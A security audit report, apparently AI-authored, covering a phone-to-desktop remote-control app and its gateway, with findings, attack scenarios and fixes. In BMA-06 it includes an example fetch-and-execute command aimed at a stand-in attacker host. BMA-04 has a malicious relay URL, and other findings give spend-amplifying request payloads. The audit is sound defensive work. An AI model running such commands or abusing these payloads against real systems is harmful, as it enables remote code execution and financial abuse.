**Remediation update — 16 October 2026**

This original report is preserved for reference. Findings were checked against the current code and addressed where applicable; see [the remediation matrix](../../docs/SECURITY-REMEDIATION-2026-10-16.md) for fixes, corrections, regression coverage, and external release requirements. Original line references and dependency totals describe the audited snapshot.

---

# Bimax — Security Deep Audit

**Date:** 2026-10-15 | **Auditor:** Muse (4 parallel specialist agents) | **Method:** OWASP MASVS v2, OWASP API Top 10 (2023), STRIDE threat modeling

**Scope:** `apps/mobile`, `apps/gateway`, `apps/desktop-responder`, `apps/relay`, `apps/cloud-relay`, `packages/protocol`, configs, dependencies.

**Relationship to prior audits:** ChatGPT's audit (2026-10-15, `production-readiness-2026-10-15.md`) found F01–F15. Every finding below is **NEW** — deduplicated against F01–F15 and against my own 2026-10-15 code review. Where a prior finding is now remediated, that is noted.

---

## Executive summary

**28 new findings: 6 High, 12 Medium, 10 Low**, plus 2 informational items.

The three findings that should keep you up at night:

1. **BMA-06 — Silent remote code execution.** A compromised phone key means silent, full RCE on the laptop: no approval gate on top-level instructions, no on-screen indicator, no host consent. TeamViewer/AnyDesk all show a persistent banner; we show nothing.
2. **BMA-01 + BMA-02 — Unbounded provider spend.** No `max_tokens` cap and no `n`-parameter stripping. One request can burn 1.28M tokens (~₹31); with the known rate-limiter race, ~₹3,060 per burst, repeatable forever.
3. **BMA-05 — Desktop identity keys are world-readable.** `identity.ts` writes both private keys with default 0644 permissions. Any local user or compromised low-priv process gets full desktop impersonation.

**Good news:** no secrets leaked anywhere in the repo (verified across all configs, docs, prompts, tests). The npm-audit "2 critical / 24 high" is 100% dev-tooling noise — zero production-reachable items (verified: prod `ws` is 8.22.0, patched). All SQL is parameterized — no injection anywhere.

---

## Methodology

Four specialist agents audited in parallel, each instructed with the full F01–F15 list and told to return only novel findings with file:line evidence:

| Agent | Standard | Area |
|---|---|---|
| Mobile | OWASP MASVS v2 | crypto, session, relay, storage, auth, deep links |
| Gateway | OWASP API Top 10 (2023) | auth, quota, ratelimit, metering, provider dispatch |
| Responder + Relays | STRIDE / remote-access | pairing, approvals, command execution, relay admission |
| Protocol + Supply chain | SLSA / config review | protocol, configs, dependencies, secret leakage |

Findings were deduplicated, severity-normalized, and cross-checked for overlap (A5/L4 both cover TLS enforcement — kept separate as mobile-side and responder-side instances of the same class).

---

## HIGH severity

### BMA-01 — No per-request `max_tokens` cap: clients dictate output spend
**File:** `apps/gateway/src/providers.ts:79` (`sanitizeRequestBody`)

`sanitizeRequestBody` strips `base_url`/`api_key`/`headers`/`authorization` but passes `max_tokens`/`max_completion_tokens` through untouched. Step D validates only that `model` is a string and `messages` is non-empty. Nothing caps output length.

**Attack:** any valid login sends `{"max_tokens": 128000}` → single request generates 128k output tokens (~₹3 at DeepSeek rates). Combined with F04's rate-limiter race (100 concurrent admitted): **~₹306 per burst**, repeatable indefinitely. The monthly quota check is binary and never sees request size.

**Fix:** clamp in `sanitizeRequestBody`: `req.max_tokens = Math.min(Number(req.max_tokens) || 4096, 4096)` (same for `max_completion_tokens`). Clamp, don't strip — better UX, documented product limit.

### BMA-02 — `n` (num completions) not stripped: 10x spend multiplier
**File:** `apps/gateway/src/providers.ts:79`

The OpenAI-compatible `n` parameter passes straight through to DeepSeek/Qwen, both of which honor it. No legitimate use case in a chat product.

**Attack:** `{"n": 10, "max_tokens": 128000}` → 10 full completions = 1.28M tokens ≈ **₹31 per request**; ~**₹3,060 per burst** with F04 concurrency. A 10x amplifier on BMA-01.

**Fix:** force `req.n = 1` (delete the field) in `sanitizeRequestBody`.

### BMA-03 — No request body size limit: worker memory exhaustion (DoS)
**File:** `apps/gateway/src/index.ts:230`

`await request.json()` with no `Content-Length` check and no size guard. Workers have ~128MB per isolate.

**Attack:** 10–50MB JSON body (giant `messages` array) → full in-memory parse before validation. A handful of concurrent large requests exhausts isolate memory → 500s for legitimate users. Secondary: megabyte-scale messages become billable input tokens (~₹3/MB).

**Fix:** check `Content-Length` before parsing; reject 413 above 256KB (generous for chat).

### BMA-04 — `parseAdvertisement` does not validate `relayUrl`: malicious QR → attacker relay
**File:** `apps/mobile/lib/crypto/pairing.ts:27-29`

Only checks non-empty string. No scheme/host validation. A malicious QR sets `"relayUrl": "ws://attacker.example:8080"`.

**Attack:** attacker swaps the QR on the victim's desk. Phone connects to attacker's WebSocket; hello (device ID, plaintext) and Noise msg1 (ephemeral pubkey, plaintext) leak before any confirmation. If the victim confirms without carefully comparing codes, attacker gets a full E2E session impersonating the desktop.

**Fix:** validate `^wss?://`, reject non-WebSocket schemes, warn/block `ws://` for non-local hosts, validate `desktopPublicKey` is 32-byte base64 at parse time.

### BMA-05 — Desktop identity private keys written world-readable
**File:** `apps/desktop-responder/src/identity.ts:111`

`fs.writeFile(filePath, JSON.stringify(stored, null, 2), "utf-8")` — no `mode` option, defaults to 0644. Leaks `noiseStaticPrivateKeyB64` and `helloPrivateKeyB64`: the desktop's entire cryptographic identity. (`persistTrustedPhone` in `pairing.ts` correctly uses `0o600` — the identity file was missed.)

**Attack:** any other local user or compromised low-privilege process reads the file → full desktop impersonation to the relay and the paired phone.

**Fix:** `{ encoding: "utf-8", mode: 0o600 }` on write, `0o700` on parent mkdir. On startup, refuse/warn if the file is group/other-readable.

### BMA-06 — Silent remote code execution: no approval gate, no local visibility, no host consent
**File:** `apps/desktop-responder/src/responder.ts` (`command_request` handler)

Validation is only: non-empty string, ≤4000 chars, `sentAt` within 120s. Then `enginePort.sendInstruction()` with the **raw instruction**. No approval gate (the 5-step gate covers engine-emitted *tool* approvals, not top-level instructions), no allowlist/denylist, no destructive-pattern confirmation, and **no on-laptop indicator** — no tray icon, no notification, nothing the user would see.

**Attack (RCE):** attacker compromises the phone key (jailbreak + SecureStore dump, phone malware) → sends `command_request` with `"curl https://evil.example/p.sh | bash"` → laptop executes silently. Single key compromise, no second factor, zero user awareness. Industry norm (TeamViewer, AnyDesk, Chrome Remote Desktop): persistent on-host indicator + host acceptance. We have neither.

**Fix (defense in depth):** (1) mandatory local indicator (tray/banner) during remote sessions; (2) configurable command policy — allowlist for unattended, denylist + host confirmation for destructive patterns; (3) log every remote instruction to the user-visible security log.

---

## MEDIUM severity

### BMA-07 — `messages` array unbounded in count and size
**File:** `apps/gateway/src/index.ts:246` — validation is only `Array.isArray && length > 0`. No upper bound on count, per-message length, or total input budget. 10,000 messages or 1MB of text all forwarded and billed as input tokens.
**Fix:** max 100 messages, max 8k chars/message, max 100k total input chars; 400 otherwise.

### BMA-08 — Quota admission is size-blind
**File:** `apps/gateway/src/quota.ts:39` — `allowed = tokensUsed < budget` never estimates the incoming request's cost. A user at 3,999,999/4,000,000 passes and can consume 200k tokens. Distinct from F05 (concurrency/reservation): this is a *single* request legally overshooting. Makes the 4M cap a suggestion.
**Fix:** estimate input tokens server-side (`chars/4` heuristic), require `tokensUsed + estimated + maxTokensCap < budget`. Composes with BMA-01's clamp.

### BMA-09 — `bimax://` OAuth interception (production risk)
**Files:** `apps/mobile/app.json:7`, `apps/mobile/app/login.tsx` — standalone builds redirect OAuth to `bimax://#access_token=...`. Custom schemes have no uniqueness guarantee; a malicious app registering the same scheme intercepts the callback → full session theft.
**Fix (before production builds):** Universal Links (iOS) / App Links (Android) with HTTPS domain verification. Not exploitable today (Expo Go uses `exp://`).

### BMA-10 — Chat history in plaintext SQLite
**File:** `apps/mobile/lib/chat-store.ts` — `bimax_chat.db` unencrypted. Lost/stolen device → history extractable via forensic tools, backup parsing, or rooted access. AI chat history routinely contains credentials users paste.
**Fix:** SQLCipher (needs custom dev client) or encrypt `content`/`reasoning` columns with a SecureStore key; at minimum `PRAGMA secure_delete` + exclude from cloud backups.

### BMA-11 — `Math.random()` for security-relevant IDs; kill-switch neutering
**Files:** `apps/mobile/lib/crypto/secure-store.ts:71`, `lib/relay/client.ts:60`, `lib/session/session.ts:106-109`, `lib/session/provider.tsx` (idempotency keys), `lib/attachments.ts:47,71`, `app/chat/[id].tsx` (Date.now()-only message IDs → same-ms SQLite PK collision → crash).

V8 `Math.random()` (xorshift128+) is predictable from observed outputs. Worst case: the kill-switch idempotency key has the least entropy (no timestamp). A predicted/colliding key makes the desktop treat the legitimate kill as a duplicate → **kill switch silently fails**.
**Fix:** `expo-crypto` `getRandomBytes()`/`randomUUID()` everywhere; message IDs as `${Date.now()}-${randomBytes}`.

### BMA-12 — WebSocket URL never validated for TLS (mobile)
**Files:** `apps/mobile/lib/relay/client.ts:24`, `lib/session/provider.tsx:437` — `relayUrl` used as-is. A `ws://` URL (via BMA-04, config tampering, or user error) puts all relay traffic in plaintext: hellos, device IDs, kinds, timing, sizes leak; Noise handshake becomes MITM-able (detection only via verification codes, if the user checks).
**Fix:** require `wss://` unless host is localhost/RFC1918, at `parseAdvertisement` and `saveTrustedDesktop`.

### BMA-13 — Attachment size trusts picker metadata (DoS)
**File:** `apps/mobile/lib/attachments.ts:24-35` — `file.size` from picker metadata (attacker-controllable); `response.text()` loads the entire file unbounded. A file reporting 100KB that is actually 2GB → OOM crash. `fetch(file.uri)` doesn't validate scheme — crafted `uri` could trigger network requests.
**Fix:** validate `uri` starts with `file://`; stream with a byte cap (abort after 200KB).

### BMA-14 — Unbounded relay outbox → memory exhaustion (mobile)
**File:** `apps/mobile/lib/relay/client.ts:46,279-293` — `outbox.push(env)` with no cap. Prolonged disconnection (network attack) while the app queues → unbounded growth → OOM crash. Desktop caps at 500; mobile has none.
**Fix:** cap at 500 (match desktop), drop oldest with user-visible warning, or spill to SQLite.

### BMA-15 — TOFU pin poisoning: persistent, unrecoverable DoS
**Files:** `apps/cloud-relay/src/room.ts`, `apps/relay/src/relay.ts` — first-connect pins the Ed25519 hello pubkey permanently (no TTL, no reset API). Attacker with the room URL (QR shoulder-surf) crafts a hello with the victim's `deviceId` signed by their own key → TOFU pins the *attacker's* key → legitimate desktop permanently rejected (`"device key changed"`) until the Durable Object is destroyed. No MITM (Noise still protects), but unrecoverable DoS.
**Fix:** pin TTL, or re-pin only with X25519 static-key proof; add explicit unpair/re-pin API.

### BMA-16 — No instruction content policy (companion to BMA-06)
**File:** `apps/desktop-responder/src/responder.ts` — no allowlist, no shell-metacharacter blocklist, no sandboxing directive at the responder layer. A bent/compromised phone — or any future AI feature auto-generating instructions — smuggles `;`, `&&`, `$()`, backticks, pipe-to-shell straight to the engine. The 4000-char/120s checks do nothing against malicious *content*.
**Fix:** configurable instruction policy in the responder: default-deny shell metacharacters unless "unrestricted remote shell" explicitly enabled; per-command risk tiers with host confirmation.

### BMA-17 — Relay traffic-analysis metadata leaks
**Files:** `apps/cloud-relay/src/logic.ts`, `apps/relay/src/relay.ts`, both `room.ts` — relay sees plaintext `from`/`to`, `kind`, `ts`, exact byte sizes (no padding), frequency, presence transitions. A curious/compromised relay operator infers activity patterns, who's talking to whom, message-type by size signature (32KB chunks = file transfer). Content stays confidential (Noise); metadata is rich.
**Fix:** document as known limitation; longer term: pad E2E envelopes to size buckets, restrict presence broadcasts to paired devices.

### BMA-18 — `better-sqlite3` prebuilt binaries bypass lockfile integrity
`better-sqlite3` (used by `apps/relay`, `apps/desktop-responder`) uses `prebuild-install`: downloads native binaries from GitHub releases **at install time**. `package-lock.json` integrity covers the npm tarball only — not the executed binary. A compromised release asset → malicious native code with full process privileges on every install.
**Fix:** `--build-from-source` in CI/prod, or pin + verify binary checksums out-of-band.

---

## LOW severity

| ID | Finding | File |
|---|---|---|
| BMA-19 | Unauthenticated 8-byte nonce header in Noise transport — bit-flipping enables selective message-drop DoS (no forgery possible) | `apps/mobile/lib/crypto/noise.ts` |
| BMA-20 | `deny` bypasses the biometric gate (`approve` requires it) — attacker with unlocked phone can DoS workflows; inconsistent with biometric-per-use model | `apps/mobile/lib/session/provider.tsx` |
| BMA-21 | Raw exception text surfaced to UI via `Alert` — future errors could leak tokens/paths into screenshots | `apps/mobile/app/chat/[id].tsx` |
| BMA-22 | Kill switch has no local fallback — relay unreachable = no way to stop a runaway agent except killing the OS process; >30s delayed kills silently dropped | `apps/desktop-responder/src/responder.ts` |
| BMA-23 | Attacker-controlled filename passed to engine (`offer.name` length-checked only) — path traversal if the real engine ever writes using `name` | `apps/desktop-responder/src/files.ts` |
| BMA-24 | MIME type self-declared, never sniffed — `text/html` with JS passes the allowlist; XSS if ever rendered in WebView | `apps/desktop-responder/src/files.ts` |
| BMA-25 | No TLS enforcement on relay connections (responder side) — `ws://` cloud relay silently downgrades transport metadata protection | `apps/desktop-responder/src/relay-client.ts` |
| BMA-26 | `setTrustedPhone()` is a public, unauthenticated trust-bypass primitive — safe today (test-only), catastrophic if the future adapter calls it | `apps/desktop-responder/src/pairing.ts` |
| BMA-27 | `protocolVersion` not covered by hello signature — no downgrade possible today (v1 only), becomes a silent downgrade vector the day v2 exists | `packages/protocol/src/index.ts:200-208` |
| BMA-28 | Wildcard `"@bimax/protocol": "*"` — resolves locally today, pulls arbitrary latest if workspace linking ever breaks | `apps/desktop-responder/package.json:17` |

---

## Informational

- **C2:** dead `better-sqlite3` in `apps/cloud-relay` devDependencies (cannot run on Workers; remove).
- **npm audit:** all 40 advisories triaged — **0 production-reachable**. The 2 criticals (vitest, tinypool) require the Vitest UI server / attacker-controlled test files (dev-only). Prod `ws` is 8.22.0 (patched). undici/node-forge instances are all under miniflare (dev simulator).
- **No secrets** in any reviewed file (configs, docs, prompts, tests, scripts).

---

## Explicitly cleared (no finding)

- **SQL injection:** all D1 queries (`.prepare().bind()`) and all SQLite queries parameterized. None found.
- **BOLA (API1):** `userId` derived only from verified JWT `sub`/KV owner; no endpoint takes user identity from client input.
- **Auth edge cases (API2):** `alg=none` rejected by jose allowlist; `jku`/`x5u` not honored by `createRemoteJWKSet`; 3-segment JWT vs 64-hex paths mutually exclusive.
- **SSRF (API7):** upstream URLs hardcoded; client `model` never interpolated into URLs; `base_url` stripped.
- **Hidden endpoints (API5):** only `/health`, `/v1/usage`, `/v1/chat/completions`; everything else 404s.
- **E2E framing:** replay protection (2000-cap seenIds + monotonic seq + bound headers) sound.
- **Approval crypto:** requestHash + Ed25519 + single-use sound; expired approvals resolve as *denied* (no auto-approve path).
- **Approval bypass:** no path executes commands without the intended gate; `command_request` bypass is by design (direct user instruction) — covered as BMA-06/M2 defense-in-depth gaps.
- **Path traversal (receive):** responder-generated file IDs, SHA-256 verified, attacker filename never touches paths.
- **Privilege escalation:** no sudo/setuid/elevation anywhere in the responder.
- **Log injection:** security log is JSONL via `JSON.stringify` — forging impossible.
- **Relay SQL:** all `sql.exec` parameterized (discipline must be maintained — consider a lint rule).

---

## Correction to prior audit

**F06 (idempotency crash window) appears remediated** in the current tree. The `idempotency.ts` now in `apps/desktop-responder/src/` is a rewritten write-ahead journal: persists *before* the engine side effect, atomic temp-file + rename + fsync with `0o600`, marks interrupted effects `"unknown"` (never auto-replays), validates keys against `__proto__`/`constructor`/`prototype`, binds keys to operation payloads. The F06 description (deferred 100ms save, swallowed write errors) matches an older implementation. **Recommend re-running the F06 reproduction against current code before treating it as open.**

---

## Fix priority (recommended order)

**Before any external user:**
1. BMA-06 + BMA-16 — silent RCE is the worst-case scenario; add the local indicator + instruction policy.
2. BMA-01 + BMA-02 + BMA-08 — spend controls (`max_tokens` clamp, `n=1`, size-aware admission). One deploy, all gateway-side.
3. BMA-05 — `0o600` on the identity file. One line.
4. BMA-04 + BMA-12 — relay URL validation (kills the malicious-QR vector and the TLS downgrade).
5. BMA-11 — replace `Math.random()` with `expo-crypto` for IDs (kill-switch integrity).
6. BMA-15 — TOFU pin TTL / re-pin API (unrecoverable DoS otherwise).

**Before production launch:**
7. BMA-03 + BMA-07 — request size bounds (DoS + spend).
8. BMA-10 — encrypted chat storage.
9. BMA-09 — Universal Links before standalone builds.
10. BMA-13 + BMA-14 — attachment and outbox caps.
11. BMA-17 — metadata minimization (document now, pad later).
12. BMA-18 — build `better-sqlite3` from source in CI.
13. Lows (BMA-19–28) — hygiene pass.

---

*End of report. 28 new findings. All with file:line evidence above.*
